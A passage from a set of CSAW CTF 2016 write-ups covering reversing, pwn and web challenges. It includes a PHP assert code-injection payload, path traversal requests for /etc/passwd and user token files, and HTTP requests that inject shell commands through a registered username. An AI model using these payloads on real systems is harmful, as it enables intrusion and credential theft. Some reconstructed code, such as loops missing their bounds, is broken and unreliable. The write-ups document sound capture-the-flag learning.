0x00458790    4 213          sym._D9deedeedee21__T3encVAyaa3_383838Z3encFNaNfAyaZAya
0x00458868    4 213          sym._D9deedeedee21__T3encVAyaa3_393939Z3encFNaNfAyaZAya
0x00458940    4 213          sym._D9deedeedee27__T3encVAyaa6_313031303130Z3encFNaNfAyaZAya
0x00458a18    4 213          sym._D9deedeedee27__T3encVAyaa6_313131313131Z3encFNaNfAyaZAya
[...]
0x00471f18    4 213          sym._D9deedeedee33__T3encVAyaa9_343931343931343931Z3encFNaNfAyaZAya
0x00471ff0    4 213          sym._D9deedeedee33__T3encVAyaa9_343932343932343932Z3encFNaNfAyaZAya
0x0
04720c8    4 213          sym._D9deedeedee33__T3encVAyaa9_343933343933343933Z3encFNaNfAyaZAya
0x004721a0    4 213          sym._D9deedeedee33__T3encVAyaa9_343934343934343934Z3encFNaNfAyaZAya
0x00472278    4 213          sym._D9deedeedee33__T3encVAyaa9_343935343935343935Z3encFNaNfAyaZAya
0x00472350    4 213          sym._D9deedeedee33__T3encVAyaa9_343936343936343936Z3encFNaNfAyaZAya
0x00472428    4 213          sym._D9deedeedee33__T3encVAyaa9_343937343937343937Z3encFNaNfAyaZAya
0x00472500    4 213          sym._D9deedeedee33__T3encVAyaa9_343938343938343938Z3encFNaNfAyaZAya
0x004725d8    4 213          sym._D9deedeedee33__T3encVAyaa9_343939343939343939Z3encFNaNfAyaZAya
0x00474a90    1 40           sym._D9deedeedee7__arrayZ
0x00474ab8    1 79           sym._D9deedeedee8__assertFiZv
```

Demangling them shows:

```
> afl~deedeedee[3] | ./demangle_names
sym.pure @safe immutable(char)[] deedeedee.encrypt(immutable(char)[])
sym.immutable(char)[] deedeedee.hexencode(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("111").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("222").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("333").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("444").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("555").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("666").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("777").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("888").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("999").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("101010").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("111111").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("121212").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("131313").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("141414").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("151515").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("161616").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("171717").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("181818").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("191919").enc(immutable(char)[])
[...]
sym.pure @safe immutable(char)[] deedeedee.enc!("485485485").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("486486486").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("487487487").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("488488488").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("489489489").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("490490490").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("491491491").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("492492492").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("493493493").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("494494494").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("495495495").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("496496496").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("497497497").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("498498498").enc(immutable(char)[])
sym.pure @safe immutable(char)[] deedeedee.enc!("499499499").enc(immutable(char)[])
sym.deedeedee.__array
sym.void deedeedee.__assert(int)
```

It seemed that these functions are used to encrypt the flag. That's why I was looking if these functions are used somewhere in the binary:

```
> axt @ sym._D9deedeedee21__T3encVAyaa3_313131Z3encFNaNfAyaZAya
call 0x44cdfe call sym._D9deedeedee21__T3encVAyaa3_313131Z3encFNaNfAyaZAya in sym._D9deedeedee7encryptFNaNfAyaZAya
> axt @ sym._D9deedeedee21__T3encVAyaa3_313131Z3encFNaNfAyaZAya | ./demangle_names
call 0x44cdfe call sym.pure @safe immutable(char)[] deedeedee.enc!("111").enc(immutable(char)[]) in sym.pure @safe immutable(char)[] deedeedee.encrypt(immutable(char)[])
```

Ok, so there is a encrypt function...
```
> pdf | ./demangle_names
```
![Encrypt function](encrypt.png)

This function calls the `enc` functions with incrementing number strings ("111", "222", "333", ..., "498498498", "499499499").

If we look at the content the `enc` functions, we'll see that they are all identical, except of using a different string ("111", "222", etc.). Based on the demangled names, I was able to decompile them approximately as follows:

```d
char[] enc(char[] data, string base) {
    auto len = cast(char) to!int(base.length);

    auto c = cycle(base);
    char[] res;
    foreach (tup; zip(c, data))
    {
        res ~= tup[0] ^ tup[1] ^ len;
    }
    return res;
}
```

By reversing the function calls, I was able to "decrypt" the flag:
```d
import std.range : cycle, zip;
import std.conv : to, hexString;
import std.stdio;

char[] enc(char[] data, string base) {
    auto len = cast(char) to!int(base.length);

    auto c = cycle(base);
    char[] res;
    foreach (tup; zip(c, data))
    {
        res ~= tup[0] ^ tup[1] ^ len;
    }
    return res;
}

int main() {

    auto data = hexString!"676c60677a74326d716c6074325f6c6575347172316773616c6d686e665f68735e6773385e345e3377657379316e327d";
    char[] res = data.dup;

    for (int i = 499; i >= 0; --i) {
        string base = to!string(i);
        res = enc(res, base ~ base ~ base);
    }

    writeln(res);
    return 0;
}
```
```
flag{t3mplat3_met4pr0gramming_is_gr8_4_3very0n3}
```



### File: ctf-writeups/csaw2016/mfw/README.md

# CSAW CTF 2016 mfw Writeup

mfw was a web challenge that included one flag for 125 points.

When launching the mfw web site at web.chal.csaw.io:8000 was introduced by the phrases 

```
Welcome to my website!
I wrote it myself from scratch!
``` 

and this is how it basically looked like: A navigation pane with three links to `Home`, `About` and `Contact`. While Home and Contact did not show something interesting, the About page revealed some nice information as he wrote: 

```
I wrote this website all by myself in under a week!
I used Git, PHP and Bootstrap 
```

Next to this it was easy to see that the developer created a common templating system based on the GET parameter `page` as all URL looked like the following:

```
http://web.chal.csaw.io:8000/?page={home,about,contact}
```

Further investigation of the source code revealed that formerly there seemed to be a fourth link within the navigation pane:

```
<ul class="nav navbar-nav">
    <li ><a href="?page=home">Home</a></li>
	<li class="active"><a href="?page=about">About</a></li>
	<li ><a href="?page=contact">Contact</a></li>
	<!--<li ><a href="?page=flag">My secrets</a></li> -->
</ul> 
```

For sure, the most obvious and therefore first try was to use a local file inclusion to get the output of /etc/passwd or the flag.php file but the following answer was returned:

```
http://web.chal.csaw.io:8000/?page=../../../../../etc/passwd

Detected hacking attempt!
```

Some more tests with different payloads and encodings lead to the fact that the code somehow detects two points, so a simple directory traversal was not possible. After some tries I found out the the flag.php file was lying within a folder called `templates`, but the inclusion of the file did not show any further information so my guess was that the flag is saved within a PHP variable of the file. 

Following the hint from the `About` page I tried to see whether the developer forgot to exclude the `.git` directory from the web server and voila: a directory listing showing the default content of a .git folder was found:

```
branches  description  hooks  info  objects      refs
config    HEAD         index  logs  packed-refs
```

Now I cloned the git repository and used `git diff` which revealed the source code of the index.php file as follows:

```
<?php
-
-if (isset($_GET['page'])) {
-       $page = $_GET['page'];
-} else {
-       $page = "home";
-}
-
-$file = "templates/" . $page . ".php";
-
-// I heard '..' is dangerous!
-assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
-
-// TODO: Make this look nice
-assert("file_exists('$file')") or die("That file doesn't exist!");
```

Jackpot! The first use of the `assert` function suffers from a remote code execution vulnerability as there is no input validation that restricts a user from using a single quote which enables him to break out of the first argument within the `strpos()` function. 

Therefore, the following payload:

```
flag','..')+or+system('cat+templates/flag.php');//
``` 

lead to the response containing the flag:

```
<?php $FLAG="flag{3vald_@ss3rt_1s_best_a$$ert}"; ?>
```


### File: ctf-writeups/csaw2016/rock/README.md

# CSAW CTF 2016 The Rock (100) Writeup

> Never forget the people's champ.

This challenge was about reversing a amd64 linux binary. I you look at the main
function with radare2, you'll notice that it seems to be a program written in c++
(due to the usage of `std::cin`, `std::cout` and `std::string`).

If you manually translate the disassembly into a c++ source code, it should roughly
look like:


```c++
int main(int argc, char** argv) {
    std::string input;
    struct S1 target;

    std::cin >> input;

    std::cout << "-------------------------------------------" << std::endl;
    std::cout << "Quote from people's champ" << std::endl;
    std::cout << "-------------------------------------------" << std::endl;
    std::cout << "*My goal was never to be the loudest or the craziest. It was to be the most entertaining." << std::endl;
    std::cout << "*Wrestling was like stand-up comedy for me." << std::endl;
    std::cout << "*I like to use the hard times in the past to motivate me today." << std::endl;
    std::cout << "-------------------------------------------" << std::endl;

    fcn_004015dc(&target, &input);
    std::cout << "Checking...." << std::endl;
    {
        std::string foo(input);
        std::string bar, baz, bla;
        fcn_0040114c(&bar, &foo);
        fcn_004010bf(&baz, &bar);
        fcn_00400ffd(&bla, &baz);
    }
    fcn_004016ba(&target);
    if(!fcn_004017e6(&target)) {
        std::cout << "/////////////////////////////////" << std::endl;
        std::cout << "Do not be angry. Happy Hacking :)" << std::endl;
        std::cout << "/////////////////////////////////" << std::endl;

        std::string output;
        fcn_004018d6(&output, &target);
        std::cout << "Flag{" << output << "}" << std::endl;
    }
    fcn_00401920(&target);

    return 0;
}
```

The given input seems to be processed in the functions `fcn_004015dc`, `fcn_004016ba`, `fcn_004017e6` and `fcn_004018d6`.
The functions `fcn_0040114c`, `fcn_004010bf` and `fcn_00400ffd` operate only on a copy of the input and the result isn't used
afterwards, therefore it might only be for obfuscation.

The first function (`fcn_004015dc`) shows that the first parameter is actually a class (and the function possibly a constructor).
The function sets one field to zero, stores two copies of our input and a third one with the string `FLAG23456912365453475897834567`
prepended.

```c++
struct S1 {
    void *vtable;
    int32_t x;
    std::string* input;
    std::string& input2;
    std::string& foo;
};
fcn_004015dc(struct S1* a, std::string& b) {
    fcn_004015c6(a);

    a->vtable = 0x401bf0;
    a->x = 0;
    a->input = std::string(b);
    a->input2 = std::string(b);
    a->foo = "FLAG23456912365453475897834567" + std::string(b);
}
```

The second function called checks if the input string is exactly 30 characters long. If this is true, it xors each character with
`0x50` and adds `20` to them. After that, it xors them with `16` and adds `9`.

```c++
fcn_004016ba(struct S1* a) {
    if(a->input.length() != 30) {
        std::cout << "Too short or too long" << std::endl;
        exit(-1);
    }

    for(int i = 0; i < ; i++) {
        a->input[i] = (a->input[i] ^ 0x50) + 20;
    }

    for(int j = 0; j < ; j++) {
        a->input[i] = (a->input[i] ^ 0x10) + 9;
    }
}
```

The third function has to return zero to continue to the output of the flag. As you can see, it compares the characters of the `foo`
field of the class (the string `FLAG...`). Only if all characters are equal, we can proceed to the flag output.
```c++
fcn_004017e6(struct S1* a) {
    for(int i = 0; i < a->input.length(); i++) {
        if(a->input[i] != a->foo[i]) {
            std::cout << "You did not pass " << i << std::endl;
            a->x = 1;         
            break;
        }
        std::cout << "Pass " << i << std::endl;
    }
    return a->x;
}
```

The function inside the if body simply copies the `input2` field to a new value (this field contains a unmodified copy of our input).
```c++
fcn_004018d6(std::string& a, struct S1* b) {
    a = b->input2;
}
```

This means that our input is actually the flag if it passes the `fcn_004017e6` check. We know that the input is transformed in the
function `fcn_004016ba` and afterwards compared to the string `FLAG23456912365453475897834567`. So all we have to do is to reverse the transformation. I've done this with python(3):
```python
>>> bytes([(((a - 9) ^ 16) - 20) ^ 0x50 for a in b"FLAG23456912365453475897834567"])
b'IoDJuvwxy\\tuvyxwxvwzx{\\z{vwxyz'
```
Our flag is `Flag{IoDJuvwxy\tuvyxwxvwzx{\z{vwxyz}`



### File: ctf-writeups/csaw2016/tutorial/README.md

# CSAW CTF 2016 tutorial (200) Writeup

> Ok sport, now that you have had your Warmup, maybe you want to checkout the Tutorial.
>
>`nc pwn.chal.csaw.io 8002`

This time we have a pwning challenge which requires a ROP chain to exploit the vulnerability.

The program is very simple and shows a menu on startup:
```
-Tutorial-
1.Manual
2.Practice
3.Quit
```

The first menu entry prints the address where the `puts` function is currently loaded:
```
>1
Reference:0x7ffff7880860
```
The function looks approximately like this:
```c
void func1(int socket) {
    char bf[56];
    void* ref = dlsym(-1, "puts");
    write(socket, "Reference:", 10);
    sprintf(buf, "%p\n", ref);
    write(socket, buf, 15);
}
```

The second entry allows to send data to a function with a stack overflow:
```
>2
Time to test your exploit...
>asdasd
asdasd
�)������
```

The function contains a buffer which can contain 300 characters (actually 312 due to alignment).
as you can see in the pseudocode below, the `read` function reads 460 characters from the user.
Additionally it sends 324 characters back instead of the original 300.

```c
void func2(int socket) {
    char buffer[300];
    bzero(buffer, 300);
    write(socket, "Time to test your exploit...\n", 0x1d);
    write(socket, ">", 1);
    read(socket, buffer, 460);
    write(socket, buffer, 324);
}
```

This helps us as the function has a stack canary to protect against buffer overflows. As we can read
324 characters from the memory, we'll get the content of the stack canary and bypass the protection.

Based on these informations, I was able to reconstruct the address of the `libc` shared library and adjust my rop chain accordingly and bypass the stack protection:
[![asciicast](https://asciinema.org/a/bsnu9h035qeg5iffpcydhrru2.png)](https://asciinema.org/a/bsnu9h035qeg5iffpcydhrru2)

[1] [exploit script](exploit.py)



### File: ctf-writeups/csaw2016/wtf.sh/README.md

# CSAW CTF 2016 wtf.sh Writeup

wtf.sh was a challenge that included two flags, one for 150pts and one for 400pts.

## wtf.sh (1) (150pts)

In the first part we needed to call the function `get_flag1` in order to receive the flag. The `post` parameter of `post.wtf` was vulnerable to a path traversal:

```
GET /profile.wtf?user=../posts HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==
```

Sending this request returned the content of all files in the sandbox directory (the code is available [here](https://kleber.io/odPM2AoqaZXmIFKZSqfbvFw46jRujfi0OvYQ2qVXpGZ1W)). There was also another path traversal in the `user` parameter of `profile.wtf` which allowed directory listings:

```
GET /profile.wtf?user=../../* HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==
```

With these two vulnerabilities we were able to read all the site's code and explore the directory structure. The user data resides in the `users` directory, where a user file included a user's name, password hash and login token. Using the first directory traversal we were able to get the login token for the admin user:

```
GET /post.wtf?post=../users/ HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==


HTTP/1.1 200 OK
[...]
<span class="post-poster">Posted by <a href="/profile.wtf?user=QNI5P">admin</a></span>
<span class="post-title">3f0b1ebe20e3682b1a5d701590ad76fb051d3a08</span>
<span class="post-body">ecX+3sJzU16hZeUPdfVy+h8kDJXsvR4DOd1QrliIBLRmgYs7sFqJvL/zRmUyhul5GtlLRbTHI/SWHMyNTcWPSw==</span>
[...]
```

In the code we saw that the `get_flag1` command will be called whenever the admin user accesses his profile on `profile.wtf`:

```bash
$ if contains 'user' ${!URL_PARAMS[@]} && file_exists "users/${URL_PARAMS['user']}"
$ then
$   local username=$(head -n 1 users/${URL_PARAMS['user']});
$   echo "<h3>${username}'s posts:</h3>";
$   echo "<ol>";
$   get_users_posts "${username}" | while read -r post; do
$       post_slug=$(awk -F/ '{print $2 "#" $3}' <<< "${post}");
$       echo "<li><a href=\"/post.wtf?post=${post_slug}\">$(nth_line 2 "${post}" | htmlentities)</li>";
$   done
$   echo "</ol>";
$   if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]]
$   then
$       get_flag1
$   fi
$ fi
```

We also see in the code (`user_functions.sh`) that whenever a user registers a directory in users_lookup will be created with the SHA1 of the username as directoroy name. In order to get the proper user ID for the admin user to access the admin profile we can just read the userid file:

```
GET /profile.wtf?user=../users_lookup/4015bc9ee91e437d90df83fb64fbbe312d9c9f05/userid HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=test; TOKEN=HqZLY8GTURdESfMQn2+vDPRL4hpafUVU+ZeEhMGllZmEoD+AVa4Ucc9bIg9ht0r0gTzoDA927dK9OgLVxfHoYw==


HTTP/1.1 200 OK
[...]
<h3>QNI5P's posts:</h3>
[...]
```

Now we can get the flag:

```
GET /profile.wtf?user=QNI5P HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=admin; TOKEN=ecX+3sJzU16hZeUPdfVy+h8kDJXsvR4DOd1QrliIBLRmgYs7sFqJvL/zRmUyhul5GtlLRbTHI/SWHMyNTcWPSw==


HTTP/1.1 200 OK
[...]
Flag: flag{l00k_at_m3_I_am_th3_4dm1n_n0w}
[...]
```

## wtf.sh (2) (400pts)

The second part of the challenge was a little bit more complicated. We had to call `get_flag2`, but the code we dumped did not include any reference. So we had to dig deeper into the code to get remote code exection.

We saw in the code that `wtf.sh` includes a function that parses and executes .wtf files:

```bash
max_page_include_depth=64
page_include_depth=0
function include_page {
    # include_page <pathname>
    local pathname=$1
    local cmd=""
    [[ "${pathname:(-4)}" = '.wtf' ]];
    local can_execute=$?;
    page_include_depth=$(($page_include_depth+1))
    if [[ $page_include_depth -lt $max_page_include_depth ]]
    then
        local line;
        while read -r line; do
            # check if we're in a script line or not ($ at the beginning implies script line)
            # also, our extension needs to be .wtf
            [[ "$" = "${line:0:1}" && ${can_execute} = 0 ]];
            is_script=$?;

            # execute the line.
            if [[ $is_script = 0 ]]
            then
                cmd+=$'\n'"${line#"$"}";
            else
                if [[ -n $cmd ]]
                then
                    eval "$cmd" || log "Error during execution of ${cmd}";
                    cmd=""
                fi
                echo $line
            fi
        done < ${pathname}
    else
        echo "<p>Max include depth exceeded!<p>"
    fi
}
```

So what we had to do is upload a file containing shell code starting with a "$" and the filename needed to have the .wtf extension. An interesting function we found in the `post_functions.sh` file was `reply`:

```bash
function reply {
    local post_id=$1;
    local username=$2;
    local text=$3;
    local hashed=$(hash_username "${username}");

    curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
    next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
    next_file=(posts/${post_id}/${next_reply_id});
    echo "${username}" > "${next_file}";
    echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
    echo "${text}" >> "${next_file}";

    # add post this is in reply to to posts cache
    echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
}
```

When replying to a post we submitted the post ID via the `post` GET parameter. This parameter was also vulnerable to path traversals, which allowed us to define a filename to write to. The function also wrote the username on the first line of the file. So if we just registered a username that contains a valid shell command and write it to a file ending with .wtf into a directory where we could access the file would give us code execution. Fourtunately, the users_lookup file did not include a `.noread` file so we could just write a .wtf file to users_lookup.

The applicaiton allowed to register users containing special chars like "$", but was buggy with usernames containing whitespaces. However, because bash allows to execute commands without whitespaces (e.g. {cat,/etc/passwd}), this was not a problem. So we've registered the user `${find,/,-iname,get_flag2}` and created a reply with the following request:

```
POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1
Host: web.chal.csaw.io:8001
Content-Type: application/x-www-form-urlencoded
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==

text=asd&submit=
```

Note that the filename is prepended with `%09` which is a horizontal tab. This is required because the reply function would interpret the name as directory name and the command would fail.

When we now call the file we get the following response:

```
GET /users_lookup/sh.wtf HTTP/1.1
Host: web.chal.csaw.io:8001
Cookie: USERNAME=${find,/,-iname,get_flag2}; TOKEN=Uf7xrOWHXoRzLdVS6drbhjHyIZVsCXFgQYnOG01UhENS1aaajeezaWrgpOno8HBljrHOMmfbQUY+rES1bWlNWQ==


HTTP/1.1 200 OK
[...]
/usr/bin/get_flag2
RE:
asd
```

So the `get_flag2` is a binary that resides in `/usr/bin/`. We now just need to create the user `$/usr/bin/get_flag2` and send the reply request again:

```
POST /reply.wtf?post=../users_lookup/sh.wtf%09 HTTP/1.1
Host: web.chal.csaw.io:8001
Content-Length: 16
Content-Type: application/x-www-form-urlencoded
Cookie: USERNAME=$/usr/bin/get_flag2; TOKEN=neappNHO7cRKNouqa1+xBYq8AWNTE2PqLcxh0JPFkaaNF5UOXc/C2fOL+JkQP65OZxc9BUkRnt1h8Z98bFbHZA==

text=asd&submit=

--

GET /users_lookup/sh.wtf HTTP/1.1
Host: web.chal.csaw.io:8001


HTTP/1.1 200 OK
[...]
Flag: flag{n0b0dy_exp3c75_th3_p4r3nth3s1s_1nqu1s1t10n}
ÿÿÿ
RE:
asd
```



### File: ctf-writeups/csaw2016/coinslot/Readme.md

# CSAW CTF 2016 coinslot Writeup

coinslot was a challenge for 25pts and the description of the challenge was

```
nc misc.chal.csaw.io 8000
```

Connecting to the server revealed the coinslot game. The coinslot game goes as follows: You are given a certain amount of dollars. Then you have to represent this amount with the least possible number of coins and dollar bills. Basically, the game asks you how much of each coin or bill you would like to provide. Here is an example:

```
$ nc misc.chal.csaw.io 8000
$0.08
$10,000 bills: 0
$5,000 bills: 0
$1,000 bills: 0
$500 bills: 0
$100 bills: 0
$50 bills: 0
$20 bills: 0
$10 bills: 0
$5 bills: 0
$1 bills: 0
half-dollars (50c): 0 
quarters (25c): 0
dimes (10c): 0
nickels (5c): 1
pennies (1c): 3
correct!
$0.09
$10,000 bills: [and so on...]
```

Therefore, we just have to write a script that solves this game until, finally, the flag is dropped. I have attached the script I created as "coinslot.py".

The program is very simple. Basically, it consists of a (float sensitive) modulo function which is used to solve the indiviual rounds. When the script is running, the amount thar is present will slowly increase. After a certain number of games (maybe around 1000) the flag was presented. 


### File: ctf-writeups/csaw2016/warmup/Readme.md

# CSAW CTF 2016 warmup Writeup

coinslot was a pwn challenge for 50pts and the description of the challenge was

```
So you want to be a pwn-er huh? Well let's throw you an easy one ;)

nc pwn.chal.csaw.io 8000
```

Connecting to the server revealed the following:

```
$ nc pwn.chal.csaw.io 8000
-Warm Up-
WOW:0x40060d
>
```

At the end you can input some string. The binary that created this output was also provided. By reversing main function of the binary, we can see that the input is taken via a 'gets'.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s;
  char v5;

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(&s, "%p\n", easy);
  write(1, &s, 9uLL);
  write(1, ">", 1uLL);
  return gets(&v5, ">");
}
```

Moreover, there is an 'easy' function within the binary:

```
int easy()
{
  return system("cat flag.txt");
}
```

The address of this function is conveniently printed within the main function 

```
sprintf(&s, "%p\n", easy); 
```

and corresponds to the address 0x40060d.

By exploiting the gets-function, we can overwrite return addresses on the stack and gain control of $rip. Then we just jump to the easy-function and we are done. The exploit code is given in the warmup.py
